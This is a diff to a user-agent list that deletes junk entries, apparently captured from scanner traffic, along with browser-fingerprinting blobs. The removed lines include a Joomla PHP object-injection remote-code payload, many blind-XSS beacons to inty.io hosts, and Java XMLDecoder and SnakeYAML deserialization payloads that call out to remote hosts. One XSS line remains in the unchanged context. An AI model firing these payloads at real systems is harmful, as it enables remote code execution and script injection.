@@ -1802,10 +1802,9 @@ Google(Linux; Android 12; SM-A715F)
 GoogleAuth/1.4 (GM8_sprout OPM1.171019.011); gzip,gzip(gfe),gzip(gfe)
 Google/Pixel 4a (Linux;Android 13)
 GoogleAuth/1.4 (mdh30xlm RKQ1.210420.001); gzip,gzip(gfe),gzip(gfe)
-192.168.111.250 - - [02/Sep/2022:10:38:45 +0000] &quot;GET /robots.txt HTTP/1.1&quot; 404 134 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot; &quot;-&quot;
 GoogleAuth/1.4 (nabu RKQ1.200826.002); gzip,gzip(gfe),gzip(gfe)
 &lt;agent&gt;Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.116 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&lt;/agent&gt;
-Google Inc.&quot;,&quot;userAgent&quot;:&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/534.24 XiaoMi/MiuiBrowser/13.23.0-gn&quot;,&quot;platform&quot;:&quot;Linux aarch64&quot;,&quot;version&quot;:&quot;5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/534.24 XiaoMi/MiuiBrowser/13.23.0-gn
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/534.24 XiaoMi/MiuiBrowser/13.23.0
 Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/110.0.5481.77 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
 GoogleAuth/1.4 (a50 PPR1.180610.011); gzip,gzip(gfe),gzip(gfe)
 Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5613.0 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
@@ -3051,7 +3050,6 @@ WordPress/4.9.3; http://mayasharespdf.website
 WordPress/4.6.11; http://masjidprojectfunder.com
 WordPress/4.9.5; http://gatehouse.org; verifying pingback from 107.175.128.65
 Mozilla/5.0 (en-us) AppleWebKit/525.13 (KHTML, like Gecko; Google Web Preview) Version/3.1 Safari/525.13
-}__test|O:21:\x22JDatabaseDriverMysqli\x22:3:{s:4:\x22\x5C0\x5C0\x5C0a\x22;O:17:\x22JSimplepieFactory\x22:0:{}s:21:\x22\x5C0\x5C0\x5C0disconnectHandlers\x22;a:1:{i:0;a:2:{i:0;O:9:\x22SimplePie\x22:5:{s:8:\x22sanitize\x22;O:20:\x22JDatabaseDriverMysql\x22:0:{}s:5:\x22cache\x22;b:1;s:19:\x22cache_name_function\x22;s:6:\x22assert\x22;s:10:\x22javascript\x22;i:9999;s:8:\x22feed_url\x22;s:54:\x22eval(base64_decode($_POST[111]));JFactory::get();exit;\x22;}i:1;s:4:\x22init\x22;}}s:13:\x22\x5C0\x5C0\x5C0connection\x22;i:1;}\xF0\x9D\x8C\x86
 python-requests/2.17.3
 Mozilla/5.0 (compatible; Googlebot/2.1; startmebot/1.0; +https://start.me/bot)
 Java/1.8.0_171
@@ -4439,75 +4437,43 @@ Mozilla/5.0 (compatible; Snacktory; +https://github.com/karussell/snacktory)
 UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCMini/11.0.0.1016 (SpeedMode; Proxy; Android 5.1.1; Andromax_A16C3H ) U2/1.0.0 Mobile
 Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp) kafe/1528122062-0
 WhatsApp/2.18.152 A
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/gtd9copwg35m6xsoygbfirnb72d0do5ftag04p\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
 WhatsApp/0.2.6430 N
 Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp) kafe/1524822098-0
 WhatsApp/2.17.393 A
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/nsjsd4sqwldz3ehrvfypcqsxyo4p1dt4hz4pse\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
 WordPress/4.7.10; http://www.vidaeuropeia.com/home
 Scrapy/1.3.1 ( http://scrapy.org)
 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36 PTST/180801.140822
 rogerbot/1.2 (https://moz.com/help/guides/moz-procedures/what-is-rogerbot, rogerbot-crawler aardwolf-crawl-production-crawler-19@moz.com)
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/ridk1ze75euxv8hznr0q72cmwd2f43wukp7fv4\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/cm255kis9zyiztlkrc4bbng70y6vwjoac5zvnk\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10 AppEngine-Google; ( http://code.google.com/appengine; appid: d~nakula-173712)
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/pkdu56kson51vg9tnhqr4skzqqwtyhq8e31tpi\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
 WordPress/4.9.6; https://projectlisboa.com
 WhatsApp/2.18.118 A
 Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp) kafe/1528908538-0
 Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp) kafe/1531593513-0
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/vvu0gcvyztg76mkzyn1xfyv51w7w2kubi65wtl\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
 UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCMini/11.0.6.1040 (SpeedMode; Proxy; Android 7.0; Redmi_Note_4 ) U2/1.0.0 Mobile
 WordPress/4.5.13; http://maxk.biz
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/wbb1wdbzfuw8mn00eohyvzb6hxnpsdk48zvpje\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
 WordPress/4.7; http://hodor.e-konomista.pt
 Y!J-ASR/1.0 crawler (http://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/s6zxr96vaqr4hjvw9kcuqv62ctirkfc601nrbg\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
 Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4) Build/MPJ24.139-64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Mobile Safari/537.36 PTST/171108.181143
 python-requests/2.5.2 CPython/2.7.14 Linux/3.13.0-36-generic
 UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCMini/10.9.0.946 (SpeedMode; Proxy; Android 6.0; Lava_A51 ) U2/1.0.0 Mobile
-Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp) kafe/1523658041-0
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/y98rs65ewll4mf86eyrxy93tnktpodg44zrpfe\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/87d1qg3ouvjekp6gc8p7wj13luryomgd48ryfn\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;java version=&quot;1.8.0_40&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;new class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;string&gt;nslookup&lt;/string&gt;&lt;string&gt;ipb9soffcrqmwjfziq3yb22q7hd8i8awz.b.inty.io&lt;/string&gt;&lt;method name=&quot;start&quot; /&gt;&lt;/new&gt;&lt;/java&gt;
+Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
 rogerbot/1.2 (https://moz.com/help/guides/moz-procedures/what-is-rogerbot, rogerbot-crawler aardwolf-production-crawler-77@moz.com)
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/4z49klz732kgavo82w56j7ze55b6du5ltgg64v\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36 PTST/180531.190558
 W3C-checklink/4.81 libwww-perl/6.15
 WhatsApp/2.18.10 A
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/vgfoz3cb3is1tcf3lvyu56aquh0gw4ovcqzgn5\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/4ej9zle7i2zgpv38hwk6y7eek5q1qpig6bt1hq\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp) kafe/1530706187-0
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/oc4tx5crgmx0nf1sfgiqwrcyipoppdh45zspge\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; QQDownload 718; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/gey9xoaw13qmrxdojgwf3r8bs2y7xvpmdh07ow\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/y433pf418wpafpt27qa0o148azgvcj4as5fv3k\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp) kafe/1533024253-0
-binlar_2.6.5 binlar@unspecified.mail
 Mozilla/4.0 (compatible; GoogleToolbar 7.5.8231.2252; Windows 6.1; MSIE 9.11.9600.18952)
 TulipChain/5.x (http://ostermiller.org/tulipchain/) Java/1.x.1_0x (http://java.sun.com/) Linux/2.4.17
 Feedshow/x.0 (http://www.feedshow.com; 1 subscriber)
 WhatsApp/2.17.296 A
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/9lv24hhp8wxfyqkhq938akf4zv5x9l1cp7cx0m\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/m7ufqu32u9jsk36ucmplwx1hl8rzhn9ex9kz8o\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-WhatsApp/2.18.207 A
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/in9n8znlrg8uy9cmqatk7lnstjzkv8nzbuykm9\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-WhatsApp/2.18.246 A
-Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB6.5; QQDownload 534; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
-Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4) Build/MPJ24.139-64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Mobile Safari/537.36 PTST/180605.140611
 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36 PTST/180308.140322
 newspaper/0.2.7
 axios/0.16.2
 WordPress/4.9.2; https://www.aandelenzoeker.be
 WhatsApp/2.18.195 A
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/wmm7po4rofycijsiurtmut79b0hrmfe621prdg\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
 WhatsApp/2.18.64 A
 WhatsApp/2.17.431 A
 Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4) Build/MPJ24.139-64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Mobile Safari/537.36 PTST/180907.120958
 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36 PTST/180228.210241
-WinHttp-Autoproxy-Service/5.1
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/g4llpx4j8epsf7tk78aioj4qahgfa32uqpdf14\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://pmfgpvcm9ynttqc6fx0589zx4oai48xwm.b.inty.io/&quot;]]]]
 Nutch Master Test/Dolphin-0.1-Beta
 WordPress/4.7.3; https://eco.pt
 WhatsApp/2.18.137 A
@@ -4517,22 +4483,6 @@ WhatsApp/2.18.206 A
 Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4) Build/MPJ24.139-64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Mobile Safari/537.36 PTST/180215.150235
 WordPress/4.9.6; https://emprestimoecreditofacil.com
 Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp) kafe/1527090336-0
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/637bon3974oiexsa6y98n93g97f0ao2fqad01p\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/q6xvr76taor2hhvu9icsqt60crioac23qydo1d\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-Apache-HttpClient/4.5 (Java/1.8.0_171)
-Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp) kafe/1533123496-0
-uipcrawler/1.0 (uipcrawler@semasio.net)
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/659bqn5994qigxua8yb8p95gb7hy8m0do8byzn\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCMini/11.1.1.1091 (SpeedMode; Proxy; Android 6.0.1; Andromax_A26C4H ) U2/1.0.0 Mobile
-rogerbot/1.2 (https://moz.com/help/guides/moz-procedures/what-is-rogerbot, rogerbot-crawler aardwolf-production-crawler-42@moz.com)
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/qmgj5yi69dywz7lyrq4pb1gl0c6c40wrkm7cv1\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp) kafe/1536321839-0
-WordPress/4.9.5; http://saindodosufoco.com
-WhatsApp/2.18.81 A
-WordPress/4.9.2; https://www.elmundoentubolsillo.es
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/z664rg62axrbhqv39rc1q269c0iy8m0do8byzn\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-WhatsApp/2.18.156 Android/7.0 Device/samsung-SM-J530F
-JetBrains 4.0 Release Candidate 3
 WhatsApp/2.18.60 i
 Apache-HttpClient/4.5 (Java/1.8.0_121)
 WordPress/4.8.3; http://savacancies.com
@@ -4541,10 +4491,6 @@ Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0; GomezAgent 3.0) Gecko/20100101 Fire
 javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/ebt7um7uy1nkovamgetd0p59p0vx0lscg73xrm\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/45.0.2454.101 Safari/537.36 AppEngine-Google; ( http://code.google.com/appengine; appid: s~xxnet-2016ke)
 python-requests/2.4.3 CPython/2.7.9 Linux/4.9.93-41.60.amzn1.x86_64
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/2117mj1550mectq64u74l51c73dx7lzcn7axym\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/7ltc6olap56jwyabozr95alhr8xa0yspgk3arz\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-javascript:/*&lt;/script&gt;&lt;svg/onload=&#039; /&quot;/ /onmouseover=1/ /[*/[]/ ((new(Image)).src=([] /\/hi3sl90ck0uxe4o3qcp7qe3u7ldch09rxmkc81\.b.inty.io/).replace(/\\/g,[]))//&#039;&gt;
-WordPress/4.9.6; http://www.bancosdeportugal.info
 WordPress/4.9.6; https://creditos-portugal.com
 WordPress/4.9.3; https://www.pubaffairsbruxelles.eu
 Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp) kafe/1531992331-0
@@ -7378,9 +7324,6 @@ Snapchat/10.81.6.81 (iPhone10,3; iOS 13.3.1; gzip)
 WordPress/5.3.3; https://its-more.jp/ja_jp
 WordPress/5.3.3; https://arshu.net
 Asana/1.4.0 WebsiteMetadataRetriever
-WordPress/5.4.1; http://localhost/wordpress-functions-tweaks
-WordPress/5.4.1; https://mukola.net
-WordPress/5.4.1; https://cspy.ru; verifying pingback from 5.39.31.208
 yacybot (/global; amd64 Linux 4.9.0-12-amd64; java 1.8.0_252; Europe/en) http://yacy.net/bot.html
 Bloglines/3.1 (http://www.bloglines.com)
 WordPress/5.4.1; https://kikkart.se
@@ -16548,12 +16491,6 @@ Mozilla/5.0 (compatible; Yahoo Ad monitoring; https://help.yahoo.com/kb/yahoo-ad
 Mozilla/5.0 (compatible; Yahoo Ad monitoring; https://help.yahoo.com/kb/yahoo-ad-monitoring-SLN24857.html)  tands-prod-eng.hlfs-prod---sieve.hlfs-desktop/1622749649-0
 UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCMini/10.9.8.1006 (SpeedMode; Proxy; Android 8.0.0; SM-N900 ) U2/1.0.0 Mobile
 WordPress/5.5.5; http://www.centr7pyadei.ru
-{\x22window.screen\x22:{\x22mozLockOrientation\x22:{ toString : function () { return \x22function mozLockOrientation() {    [native code]}\x22;}},\x22mozUnlockOrientation\x22:{ toString : function () { return \x22function mozUnlockOrientation() {    [native code]}\x22;}},\x22availWidth\x22:414,\x22availHeight\x22:736,\x22width\x22:414,\x22height\x22:736,\x22colorDepth\x22:24,\x22pixelDepth\x22:24,\x22top\x22:0,\x22left\x22:0,\x22availTop\x22:0,\x22availLeft\x22:0,\x22mozOrientation\x22:\x22portrait-primary\x22,\x22onmozorientationchange\x22:null,\x22orientation\x22:{\x22lock\x22:[\x22\x22],\x22unlock\x22:[\x22\x22],\x22type\x22:\x22portrait-primary\x22,\x22angle\x22:0,\x22onchange\x22:null,\x22addEventListener\x22:[\x22\x22],\x22removeEventListener\x22:[\x22\x22],\x22dispatchEvent\x22:[\x22\x22],toString: function () {return \x22[object ScreenOrientation]\x22;}},\x22addEventListener\x22:{ toString : function () { return \x22function addEventListener() {    [native code]}\x22;}},\x22removeEventListener\x22:{ toString : function () { return \x22function removeEventListener() {    [native code]}\x22;}},\x22dispatchEvent\x22:{ toString : function () { return \x22function dispatchEvent() {    [native code]}\x22;}}},\x22window\x22:{\x22mozInnerScreenX\x22:0.7666666507720947,\x22mozInnerScreenY\x22:30.766666412353516,\x22mozPaintCount\x22:0,\x22onmozfullscreenchange\x22:null,\x22onmozfullscreenerror\x22:null,\x22onmozpointerlockchange\x22:null,\x22onmozpointerlockerror\x22:null,\x22navigator\x22:{\x22getBattery\x22:{ toString : function () { return \x22function getBattery() {    [native code]}\x22;}},\x22vibrate\x22:{ toString : function () { return \x22function vibrate() {    [native code]}\x22;}},\x22javaEnabled\x22:function javaEnabled() {return true;},\x22getDeviceStorage\x22:{ toString : function () { return \x22function getDeviceStorage() {    [native code]}\x22;}},\x22getDeviceStorages\x22:{ toString : function () { return \x22function getDeviceStorages() {    [native code]}\x22;}},\x22getDeviceStorageByNameAndType\x22:{ toString : function () { return \x22function getDeviceStorageByNameAndType() {    [native code]}\x22;}},\x22getGamepads\x22:{ toString : function () { return \x22function getGamepads() {    [native code]}\x22;}},\x22sendBeacon\x22:{ toString : function () { return \x22function sendBeacon() {    [native code]}\x22;}},\x22registerProtocolHandler\x22:{ toString : function () { return \x22function registerProtocolHandler() {    [native code]}\x22;}},\x22registerContentHandler\x22:{ toString : function () { return \x22function registerContentHandler() {    [native code]}\x22;}},\x22mimeTypes\x22:{ toString : function () {       return \x22[object MimeTypeArray]\x22;}},\x22plugins\x22:{ toString : function () {       return \x22[object PluginArray]\x22;}},\x22doNotTrack\x22:\x22unspecified\x22,\x22battery\x22:{\x22charging\x22:false,\x22chargingTime\x22:null,\x22dischargingTime\x22:5208,\x22level\x22:0.2,\x22onchargingchange\x22:null,\x22onchargingtimechange\x22:null,\x22ondischargingtimechange\x22:null,\x22onlevelchange\x22:null,\x22addEventListener\x22:[\x22\x22],\x22removeEventListener\x22:[\x22\x22],\x22dispatchEvent\x22:[\x22\x22],toString: function () {return \x22[object BatteryManager]\x22;}},\x22oscpu\x22:\x22Linux armv7l\x22,\x22vendor\x22:\x22\x22,\x22vendorSub\x22:\x22\x22,\x22productSub\x22:\x2220100101\x22,\x22cookieEnabled\x22:true,\x22buildID\x22:\x2220160726133114\x22,\x22deviceStorageAreaListener\x22:{\x22onstorageareachanged\x22:null,\x22addEventListener\x22:[\x22\x22],\x22removeEventListener\x22:[\x22\x22],\x22dispatchEvent\x22:[\x22\x22],toString: function () {return \x22[object DeviceStorageAreaListener]\x22;}},\x22mozNotification\x22:{\x22createNotification\x22:[\x22\x22],toString: function () {return \x22[object DesktopNotificationCenter]\x22;}},\x22connection\x22:{\x22type\x22:\x22wifi\x22,\x22ontypechange\x22:null,\x22addEventListener\x22:[\x22\x22],\x22removeEventListener\x22:[\x22\x22],\x22dispatchEvent\x22:[\x22\x22],toString: function () {return \x22[object NetworkInformation]\x22;
-WordPress/5.7.2; https://www.routech.ro
-Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) adbeat.com/policy Gecko/20100101 Firefox/88.0
-WhatsApp/2.21.12.4 A
-WhatsApp/2.21.12.7 A
-WhatsApp/2.2121.5 N
 WordPress/5.7.2; https://rucore.net/p
 Mozilla/5.0 (compatible; Yahoo Ad monitoring; https://help.yahoo.com/kb/yahoo-ad-monitoring-SLN24857.html)  tands-prod-eng.hlfs-prod---sieve.hlfs-desktop/1622773691-10
 Mozilla/5.0 (compatible; Yahoo Ad monitoring; https://help.yahoo.com/kb/yahoo-ad-monitoring-SLN24857.html)  tands-prod-eng.hlfs-prod---sieve.hlfs-desktop/1622842622-10
@@ -25006,7 +24943,6 @@ Friendica 'Giant Rhubarb' 2022.06-1469; https://loma.ml
 Friendica 'Giant Rhubarb' 2022.06-1469; https://libranet.de
 Friendica 'Giant Rhubarb' 2022.06-1469; https://venera.social
 googlebot/2.\xE2\x80\x8B\xE2\x80\x8B1 (+http://www.googlebot.com/bot.html)
-{\x22valid\x22:true,\x22payload\x22:\x22(function(){var refs={};;var aliases={};aliases[\x5C\x22window.navigator.userAgent\x5C\x22] = eval(\x5C\x22window.navigator.userAgent\x5C\x22);aliases[\x5C\x22window.navigator\x5C\x22] = eval(\x5C\x22window.navigator\x5C\x22);aliases[\x5C\x22window.navigator.language\x5C\x22] = eval(\x5C\x22window.navigator.language\x5C\x22);aliases[\x5C\x22window.navigator.languages\x5C\x22] = eval(\x5C\x22window.navigator.languages\x5C\x22);aliases[\x5C\x22window.navigator.geolocation\x5C\x22] = eval(\x5C\x22window.navigator.geolocation\x5C\x22);aliases[\x5C\x22window.navigator.webkitTemporaryStorage\x5C\x22] = eval(\x5C\x22window.navigator.webkitTemporaryStorage\x5C\x22);aliases[\x5C\x22window.navigator.webkitPersistentStorage\x5C\x22] = eval(\x5C\x22window.navigator.webkitPersistentStorage\x5C\x22);aliases[\x5C\x22window.navigator.getBattery\x5C\x22] = eval(\x5C\x22window.navigator.getBattery\x5C\x22);aliases[\x5C\x22window.navigator.sendBeacon\x5C\x22] = eval(\x5C\x22window.navigator.sendBeacon\x5C\x22);aliases[\x5C\x22window.navigator.getGamepads\x5C\x22] = eval(\x5C\x22window.navigator.getGamepads\x5C\x22);aliases[\x5C\x22window.navigator.javaEnabled\x5C\x22] = eval(\x5C\x22window.navigator.javaEnabled\x5C\x22);aliases[\x5C\x22window.navigator.vibrate\x5C\x22] = eval(\x5C\x22window.navigator.vibrate\x5C\x22);aliases[\x5C\x22window.navigator.permissions\x5C\x22] = eval(\x5C\x22window.navigator.permissions\x5C\x22);aliases[\x5C\x22window.navigator.credentials\x5C\x22] = eval(\x5C\x22window.navigator.credentials\x5C\x22);aliases[\x5C\x22window.navigator.mediaDevices\x5C\x22] = eval(\x5C\x22window.navigator.mediaDevices\x5C\x22);aliases[\x5C\x22window.navigator.serviceWorker\x5C\x22] = eval(\x5C\x22window.navigator.serviceWorker\x5C\x22);aliases[\x5C\x22window.navigator.storage\x5C\x22] = eval(\x5C\x22window.navigator.storage\x5C\x22);aliases[\x5C\x22window.navigator.presentation\x5C\x22] = eval(\x5C\x22window.navigator.presentation\x5C\x22);aliases[\x5C\x22window.navigator.requestMediaKeySystemAccess\x5C\x22] = eval(\x5C\x22window.navigator.requestMediaKeySystemAccess\x5C\x22);aliases[\x5C\x22window.navigator.getUserMedia\x5C\x22] = eval(\x5C\x22window.navigator.getUserMedia\x5C\x22);aliases[\x5C\x22window.navigator.webkitGetUserMedia\x5C\x22] = eval(\x5C\x22window.navigator.webkitGetUserMedia\x5C\x22);aliases[\x5C\x22window.navigator.registerProtocolHandler\x5C\x22] = eval(\x5C\x22window.navigator.registerProtocolHandler\x5C\x22);aliases[\x5C\x22window.navigator.unregisterProtocolHandler\x5C\x22] = eval(\x5C\x22window.navigator.unregisterProtocolHandler\x5C\x22);aliases[\x5C\x22window.navigator.requestMIDIAccess\x5C\x22] = eval(\x5C\x22window.navigator.requestMIDIAccess\x5C\x22);;})();\x22,\x22plugins\x22:[{\x22ref\x22:842281895,\x22description\x22:\x22Portable Document Format\x22,\x22filename\x22:\x22internal-pdf-viewer\x22,\x22name\x22:\x22Chrome PDF Plugin\x22,\x22mimes\x22:[-1628473889]},{\x22ref\x22:1010824838,\x22description\x22:\x22\x22,\x22filename\x22:\x22mhjfbmdgcfjbbpaeojofohoefgiehjai\x22,\x22name\x22:\x22Chrome PDF Viewer\x22,\x22mimes\x22:[-1248334925]},{\x22ref\x22:-1466093580,\x22description\x22:\x22\x22,\x22filename\x22:\x22internal-nacl-plugin\x22,\x22name\x22:\x22Native 